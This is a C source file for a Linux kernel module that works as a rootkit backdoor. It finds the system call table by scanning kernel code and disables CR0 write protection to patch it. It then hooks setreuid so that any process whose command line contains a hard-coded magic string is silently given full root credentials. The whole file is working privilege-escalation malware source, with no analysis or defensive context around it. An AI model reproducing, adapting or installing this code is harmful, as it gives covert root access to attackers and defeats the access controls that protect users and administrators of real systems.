
#include "second.h"



#define MY_OWN_DEBUG

#define NUMBER_OF_FUNCTIONS 1
#define SYS_SETREUID_NUM 0


typedef long (*SETREUID_P) (uid_t ruid, uid_t euid);

//
// globals
//
SYSSERV_INF *ssPtr;
int ssSize = NUMBER_OF_FUNCTIONS;

void *sys_call_table;
struct cpumask *cpus;

const char *magicString = "xxxGANGNAM-STYLExxx"; // if this string is into argv, process is trusted


//
// Service functions
//
void intToStrRadixDec (char *chBuf, int szBuf, int val) {
	int tmp, base = 10, j = 9;
	
	if (szBuf < 11) {
#ifdef MY_OWN_DEBUG
		printk ("Passed buffer's size is too short for intToStrRadixDec\n");
#endif
		chBuf [0] = '\0';
		return;
	}
	for (int i = 0; i < szBuf; ++i) chBuf [i] = '0';
	if (val == 0) {
		chBuf[1] = '\0';
		return;
	}
	chBuf [j + 1] = '\0';
	
	while (val > 0) {
		tmp = val % base;
		val /= base;
		chBuf [j] += tmp;
		--j;
	}
	j = 0;
	for (int i = 10; j < i; ++j) {
		if (chBuf [j] != '0') break;
	}
	// j is an index of first significant char
	for (int i = 0; j <= 10; ++i, ++j) chBuf [i] = chBuf [j];
	
	return;
}


int readFileData (const char *fileName, void *buf, size_t count) {
	int ret = 0;
	mm_segment_t oldFs;
	loff_t posFile = 0;
	struct file *filePtr;
	
	
	oldFs = get_fs();
	set_fs (KERNEL_DS);
	filePtr = filp_open (fileName, O_RDONLY, 0);
	if (IS_ERR (filePtr)) {
#ifdef MY_OWN_DEBUG
		printk ("Can't open: %s - %d\n", fileName, (int)filePtr);
#endif
		set_fs (oldFs);
		return 0;
	}
	
	if ((ret = vfs_read (filePtr, buf, count, &posFile)) < 0) {
#ifdef MY_OWN_DEBUG
		printk ("Error at reading from: %s, ret: %d\n", fileName, (int)ret);
#endif
		ret = 0;
	}
	set_fs (oldFs);
	filp_close (filePtr, NULL);
	
	
	return ret;
}


int isTrustedProcess () {
	const int bufSz = 16;
	char *bufPtr, *chBuf;
	struct file *filePtr;
	loff_t posFile = 0;
	ssize_t retLen;
	const int nameLen = 256;
	mm_segment_t oldFs;
	int ret = 0;
	
	
	if (!(bufPtr = kmalloc (bufSz, GFP_KERNEL))) return 0;
	if (!(chBuf = kmalloc (nameLen, GFP_KERNEL))) return 0;
	intToStrRadixDec (bufPtr, bufSz, current->tgid);

	strcpy (chBuf, "/proc/");
	strcat (chBuf, bufPtr);
	strcat (chBuf, "/cmdline");
	kfree (bufPtr);
	oldFs = get_fs();
	set_fs (KERNEL_DS);
	
	filePtr = filp_open (chBuf, O_RDONLY, 0);
	if (IS_ERR (filePtr)) {
#ifdef MY_OWN_DEBUG
		//printk ("Can't open: %s - %d\n", chBuf, (int)filePtr);
#endif
		kfree (chBuf);
		set_fs (oldFs);
		return 0;
	}
	
	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
#ifdef MY_OWN_DEBUG
		//printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
#endif
		filp_close (filePtr, NULL);
		kfree (chBuf);
		set_fs (oldFs);
		return 0;
	}
	set_fs (oldFs);
	
	for (unsigned i = 0; i < retLen; ++i) if (chBuf[i] == '\0') chBuf [i] = '_';
	chBuf[retLen] = '\0';
	if (strstr (chBuf, magicString)) ret = 1;
#ifdef MY_OWN_DEBUG
	//if (ret) printk ("Trusted process");
#endif
	filp_close (filePtr, NULL);
	kfree (chBuf);
	
	
	return ret;
}
		

long newSetreuid (uid_t ruid, uid_t euid) {
	struct cred *newCreds;
	long ret;
	
	
#ifdef MY_OWN_DEBUG
	printk ("Intercepted function setreuid\n");
	printk ("Number of counter BEFORE: %ld\n", atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls));
#endif
	
	atomic64_inc (& ssPtr[SYS_SETREUID_NUM].numOfCalls);
	if (ssPtr[SYS_SETREUID_NUM].sysPtrOld)
	{
		if (isTrustedProcess ())
		{
			if (!(newCreds = prepare_creds ())) {
				ret = -ENOMEM;
			}
			else {
				// to zero all field an id also
				newCreds->uid = newCreds->gid = 0;
				newCreds->suid = newCreds->sgid = 0;
				newCreds->euid = newCreds->egid = 0;
				newCreds->fsuid = newCreds->fsgid = 0;
				
				ret = commit_creds (newCreds);
			}
		}
		else {
			ret = ((SETREUID_P)(ssPtr[SYS_SETREUID_NUM].sysPtrOld)) (ruid, euid);
		}
		
		atomic64_dec (& ssPtr[SYS_SETREUID_NUM].numOfCalls);
#ifdef MY_OWN_DEBUG
		printk ("Number of counter AFTER: %ld\n", atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls));
#endif
		
		return ret;
	}
	else
	{
		atomic64_dec (& ssPtr[SYS_SETREUID_NUM].numOfCalls);
#ifdef MY_OWN_DEBUG
		printk ("Number of counter AFTER: %ld\n", atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls));
#endif
		
		return -EPERM;
	}
}

//
// Start/stop functions
//

void fillServiceTable (void *sscltPtr) {
	ssPtr[SYS_SETREUID_NUM].sysPtrNew = &newSetreuid;
	ssPtr[SYS_SETREUID_NUM].sysPtrOld = ((void**)sscltPtr)[__NR_setreuid];
	ssPtr[SYS_SETREUID_NUM].sysNum = __NR_setreuid;
	
	return;
}


void changeSyscallTable (void *scltPtr, int sysNum, void *newPtr, void **oldPtr) {
	// disable memory protection to writing
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("andq $0xfffffffffffeffff, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
	
	*oldPtr = ((void**)scltPtr) [sysNum];
	((void**)sys_call_table) [sysNum] = newPtr;
	
	// enable memory protection to writing
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("xorq $0x0000000000010000, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
	
	return;
}


int setFunc (void *datPtr) {
	DATA_FN *dat = (DATA_FN*)datPtr;
	
	changeSyscallTable (dat->scltPtr, dat->sysNum, dat->newPtr, dat->oldPtr);
	
	return 0;
}


int start (void) {
	int i, lo, hi;
	void *system_call;
	unsigned char *ptr;
	DATA_FN dat;
	
	
	if (!(cpus = kmalloc (sizeof (struct cpumask), GFP_KERNEL))) {
#ifdef MY_OWN_DEBUG
		printk ("Insufficient of memory, error of kmalloc\n");
#endif
		return -ENOMEM;
	}
	cpumask_clear (cpus);
	cpumask_bits (cpus)[0] = 1;
	
	if (!(ssPtr = kmalloc (ssSize * sizeof (SYSSERV_INF), GFP_KERNEL))) {
#ifdef MY_OWN_DEBUG
		printk ("Insufficient of memory, error of kmalloc\n");
#endif
		kfree (cpus);
		return -ENOMEM;
	}
	memset (ssPtr, 0, ssSize * sizeof (SYSSERV_INF));
	fillServiceTable (ssPtr);
	
	//asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
	rdmsr (MSR_LSTAR, lo, hi);
	system_call = (void*)(((long)hi<<32) | lo);
	
	// 0xff14c5 - is opcode of relative call instruction at x64 (relative address is 4 byte value)
	// 500 may be dangerous, we go byte by byte at code of system_call
	for (ptr = system_call, i = 0; i < 500; i++) {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
			sys_call_table = (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
			break;
		}
		ptr++;
	}
	if (!sys_call_table) return -ENOSYS;
	else {
#ifdef MY_OWN_DEBUG
		printk ("Have found sys_call_table address: %p\n", sys_call_table);
#endif
	}
	
	
	//init_completion (&synchUnload);
	
	fillServiceTable (sys_call_table);
	dat.scltPtr = sys_call_table;
	for (int i = 0; i < ssSize; ++i) {
		dat.sysNum = ssPtr[i].sysNum;
		dat.newPtr = ssPtr[i].sysPtrNew;
		dat.oldPtr = & ssPtr[i].sysPtrOld;
		
		stop_machine(&setFunc, &dat, cpus);
	}
	
	
	return 0;
}

void stop (void) {	
	DATA_FN dat = {sys_call_table};
	
#ifdef MY_OWN_DEBUG
	printk ("Unloading start\n");
#endif
	for (int i = 0; i < ssSize; ++i) {
		dat.sysNum = ssPtr[i].sysNum;
		dat.newPtr = ssPtr[i].sysPtrOld;
		dat.oldPtr = & ssPtr[i].sysPtrOld;
		
		stop_machine(&setFunc, &dat, cpus);
	}
	stop_machine(&setFunc, &dat, cpus);
	kfree (cpus);
	
#ifdef MY_OWN_DEBUG
	printk ("Before last mark\n");
#endif
	//wait_for_completion (&synchUnload); // Я собственоручно сделал дедлок. Если счетчик вызовов обнулен и пришел запрос
	// на выгрузку - процесс будет висеть бесконечно, т.к. его условную переменную никто не просигналит.
	while (atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls)) {
		set_current_state (TASK_INTERRUPTIBLE);
#ifdef MY_OWN_DEBUG
		printk ("Waiting, read cnt: %ld, readdir cnt: %ld\n",
				atomic64_read (& ssPtr[SYS_SETREUID_NUM].numOfCalls)
		);
#endif
		schedule_timeout (5 * HZ);
	}
	kfree (ssPtr);
#ifdef MY_OWN_DEBUG
	printk ("Bye bye\n");
#endif
	
	
	return;
}



module_init(start);
module_exit(stop);
MODULE_LICENSE ("GPL");






